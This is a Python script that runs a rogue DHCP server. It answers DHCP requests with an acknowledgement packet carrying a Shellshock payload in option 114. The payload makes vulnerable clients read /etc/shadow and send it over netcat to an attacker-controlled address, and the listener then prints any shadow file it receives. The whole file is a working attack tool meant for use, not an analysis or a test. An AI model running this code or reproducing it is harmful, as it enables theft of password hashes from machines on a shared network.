import socket
import select
from binascii import hexlify
import collections
import time
import itertools

def flatten_list(ze_list):
    '''
    Flatens a list of lists
    '''
    for sublist in ze_list:
        if isinstance(sublist, collections.Iterable) and not isinstance(sublist, (str, bytes)):
            yield from flatten_list(sublist)
        else:
            yield sublist


class Listener:
    '''
    configures the listener for capturing dhcp requests
    '''
    def __init__(self):
        self.client_list = []
        self.current_discovery = []

        self.dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    def start(self):
        '''
        Starts the socket listener and replies when appropriate
        '''
        self.dhcp_socket.bind(('', 67))
        while True:
            r, w, x = select.select([self.dhcp_socket], [], [])

            for each in r:
                print('Recieved Something!')
                frame, void = each.recvfrom(10000)
                print(void)
                # print(frame)

                if frame.startswith(b'root'):
                    print('[!] Got shadow file')
                    print(frame)
                    break

                # breakup the message into its bytes
                dhcp_message = [frame[i:i+1] for i in range(0, len(frame), 1)]
                dhcpPacket = DhcpPacket(dhcp_message)

                if dhcpPacket.op == [b'\x02']:
                    # This is a reply not a request, it has come from a dhcp server and is junk
                    break

                # Check for current transaction
                if any(x.xid == dhcpPacket.xid for x in self.current_discovery):
                    for eachPacket in self.current_discovery:
                        if eachPacket.xid == dhcpPacket.xid:

                            # CONFIRM PACKET IS REQUEST
                            for each_option in dhcpPacket.options:
                                if each_option.flag == b'\x35':
                                    if each_option.values == [b'\x03']:
                                        print('[+] Crafting ACK')
                                        ack = eachPacket.craft_ack()
                                        self.dhcp_socket.sendto(ack, ('255.255.255.255', 68))
                                        self.client_list.append(eachPacket)
                                        self.current_discovery.remove(eachPacket)
                                    break
                else:

                    # CONFIRM PACKET IS DISCOVERY
                    for each_option in dhcpPacket.options:
                        if each_option.flag == b'\x35':
                            if each_option.values == [b'\x01']:
                                print('[+] Crafting offer')
                                self.current_discovery.append(dhcpPacket)
                                offer = dhcpPacket.craft_offer()
                                self.dhcp_socket.sendto(offer, ('255.255.255.255', 68))
                            break


class DhcpPacket:
    '''
    Parse the message finding the difrent options and values of the dhcp packet
     '''
    def __init__(self, dhcp_message):
        self.exploit = b"() { :;};/bin/cat/ /etc/shadow | nc -u 192.168.0.23 67"  # % (self.ip, self.port)
        self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
        self.exploit_len = (len(self.exploit)).to_bytes(1, byteorder='big')

        frame = dhcp_message

        self.op = [frame[0]]  # REquest or reply
        self.htype = [frame[1]]  # Hardware address type
        self.hlen = [frame[2]]  # Hardware length
        self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
        self.xid = frame[4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
        self.flags = frame[10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = frame[12:16]  # client ip address
        self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
        self.siaddr = frame[20:24]  # Server ip address
        self.giaddr = frame[24:28]  # first relay agent ip address
        self.chaddr = frame[28:44]  # client hardware address
        self.sname = frame[44:108]  # server host name
        self.file = frame[108:236]  # boot file name, routing information defined by server to the client // legacy
        self.magic_cookie = frame[236:240]
        self.options = frame[240:]  # additional parameters
        self.options = self.breakup_options(self.options)

        self.offer = None
        self.ack = None

    def craft_offer(self):
        ''' Craft a offer from the given discovery '''
        op = [b'\x02']  # request=01 or reply=02
        htype = [b'\x01']  # Hardware address type 01=ethernet
        hlen = [b'\x06']  # Hardware length
        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
        xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
        flags = self.flags  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        ciaddr = self.ciaddr  # client ip address
        yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
        self.yiaddr = yiaddr
        siaddr = dhcpServer.server_ip  # Server ip address
        self.siaddr = siaddr
        giaddr = self.giaddr  # first relay agent ip address
        chaddr = self.chaddr  # client hardware address
        sname = self.sname  # server host name
        file = self.file  # bootfile name, routing information defined by server to the client
        magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
        options = [b'\x35', b'\x01', b'\x02',  # DHCP, len, Offer
                   b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
                   b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
                   b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
                   b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
                   b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17', # DHCP server identifier (ip address)
                   # b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   b'\xff',  # end flag
                   # padding to end at word boundry for the options
                   ]

        options = list(flatten_list(options))

        return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
                         file, magic_cookie, options]

        return_packet = [item for sublist in return_packet for item in sublist]
        return_packet = b''.join(return_packet)
        return return_packet

    def craft_ack(self):
        ''' Craft an acknoledgment from precious known data from this transaction '''

        op = [b'\x02']  # REquest or reply
        htype = [b'\x01']  # Hardware address type
        hlen = [b'\x06']  # Hardware length
        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
        xid = self.xid  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
        flags = self.flags # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        ciaddr = self.ciaddr  # client ip address
        yiaddr = self.yiaddr  # 'your' ip address, as assigned by server
        siaddr = self.siaddr  # Server ip address
        giaddr = self.giaddr  # first relay agent ip address
        chaddr = self.chaddr  # client hhardware address
        sname = self.sname  # server host name
        file = self.file  # bootfile name, routing information defined by server to the client
        magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
        options = [b'\x35', b'\x01', b'\x05',  # DHCP, len, Offer
                   b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
                   b'\x03', b'\x04', dhcpServer.router_ip,
                   #b'\x06', b'\x05', dhcpServer.primary_dns,
                   b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
                   b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
                   b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
                   b'\x36', b'\x04', b'\xc0', b'\xa8', b'\00', b'\x17',  # DHCP server identifier (ip address)
                   b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   b'\xff',  # end flag
                   # padding to end at word boundry for the options
                   ]

        options = list(flatten_list(options))

        return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
                         file, magic_cookie, options]

        return_packet = [item for sublist in return_packet for item in sublist]
        return_packet = b''.join(return_packet)
        return return_packet

    def breakup_options(self, option_string):
        ''' parse the options from the given packet'''
        print('[+] breaking up options')
        cur = 0
        option_string = [x for x in option_string]
        options = []
        while True:
            # try:
            flag = option_string[cur]
            if flag == b'\xff':
                break
            cur += 1
            length = option_string[cur]
            cur += 1

            # TURN LENGTH INTO AN INT
            values = option_string[cur:ord(length) + cur]
            cur += ord(length)

            option = self.Option(flag, length, values)
            options.append(option)
        return options

    class Option:
        ''' for storing options '''
        def __init__(self, flag, length, values):
            self.flag = flag
            self.length = length
            self.values = values

class Client:
    ''' for storing client data, not yet used '''
    def __init__(self, dhcpPacket):
        self.ip = dhcpPacket.ciaddr
        self.physical_address = dhcpPacket.chaddr


class DhcpServer:
    ''' For storing variables about the current state of the dhcp server; available ip addresses, subnet etc'''
    def __init__(self):
        self.server_ip = (b'\xc0', b'\xa8', b'\x00', b'\x17')
        self.server_name = (b'\x6c', b'\x61', b'\x70', b'\x70', b'\x79')
        self.router_ip = (b'\xc0', b'\xa8', b'\x00', b'\x17')
        self.primary_dns =  (b'\xc0', b'\xa8', b'\x00', b'\x17')

        client_ip_available = (itertools.product([192], [168], [0], range(1, 255, 1)))
        self.client_ip_available = [tuple([bytes(x)[i:i + 1] for i in range(0, len(x), 1)]) for x in client_ip_available]

        self.client_subnet = (b'\xff', b'\xff', b'\xff', b'\x00')

    def get_next_ip(self):
        ''' Get the next available ip addresses, !ip addresses are never recovered!'''
        ip = self.client_ip_available.pop()
        print('[+] Assigning ip Address: %s' % str(ip))
        return ip


def main():
    global dhcpServer
    dhcpServer = DhcpServer()

    listener = Listener()
    listener.start()


if __name__ == '__main__':
    main()
